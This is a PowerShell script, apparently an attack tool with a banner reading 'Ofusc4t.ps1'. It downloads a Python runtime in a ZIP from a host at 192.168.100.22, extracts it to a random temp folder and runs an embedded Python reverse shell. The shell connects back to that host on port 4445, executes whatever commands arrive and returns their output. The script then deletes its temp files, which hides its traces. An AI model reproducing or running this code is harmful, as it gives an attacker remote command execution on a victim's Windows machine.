Write-Host "   ___   __                _  _            __"
Write-Host "  / _ \ / _|              | || |          / _|"
Write-Host " | | | | |_ _   _ ___  ___| || |_ _ __  ___| |"
Write-Host " | | | |  _| | | / __|/ __|__   _| '_ \/ __| |"
Write-Host " | |_| | | | |_| \__ \ (__   | |_| |_) \__ \ |"
Write-Host "  \___/|_|  \__,_|___/\___|  |_(_) .__/|___/_|"
Write-Host "                                 | |          "
Write-Host "                                 |_|          "


Write-Host "  _   _     _   _   _   _   _   _   _   _ "
Write-Host " / \ / \   / \ / \ / \ / \ / \ / \ / \ / \"
Write-Host "( B | y ) ( B | l | 4 | d | s | c | 4 | n )"
Write-Host " \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/"



# URL do arquivo ZIP do Python
$pythonUrl = "http://192.168.100.22:4444/python3.zip"

# Script Python a ser executado
$pythonScript = @"
import socket
import os
import sys
import subprocess

ips = '192.168.100.22'  
p = 4445

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ips, p))

while True:
    i = s.recv(1024).decode()
    if i.strip().lower() == 'exit':
        s.close()
        sys.exit()
    try:
        command = i
        output = subprocess.getoutput(command)
        output += '\n'  
        s.send(output.encode())
    except Exception as e:
        error_message = str(e)
        error_message += '\n'  
        s.send(error_message.encode())
"@

try {
    # Carrega o arquivo ZIP do Python em memória
    $pythonZip = Invoke-WebRequest -Uri $pythonUrl -UseBasicParsing

    # Cria um objeto MemoryStream para armazenar o conteúdo do arquivo ZIP
    $memoryStream = New-Object System.IO.MemoryStream
    $memoryStream.Write($pythonZip.Content, 0, $pythonZip.Content.Length)
    $memoryStream.Seek(0, 'Begin')

    # Define o diretório temporário para extrair os arquivos
    $tempDirectory = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetRandomFileName())
    $extractPath = Join-Path -Path $tempDirectory -ChildPath 'python'

    # Extrai os arquivos do arquivo ZIP em memória para o diretório temporário
    [System.IO.Compression.ZipFileExtensions]::ExtractToDirectory($memoryStream, $extractPath)

    # Executa o script Python
    $output = & $extractPath\python.exe -c $pythonScript 2>&1

    # Imprime a saída do script Python
    Write-Output $output
}
catch {
    Write-Error "Ocorreu um erro durante a execução do script: $_"
}
finally {
    # Remove o diretório temporário e libera os recursos
    if ($extractPath -and (Test-Path $extractPath)) {
        Remove-Item -Path $extractPath -Recurse -Force
    }
    if ($memoryStream) {
        $memoryStream.Dispose()
    }
}
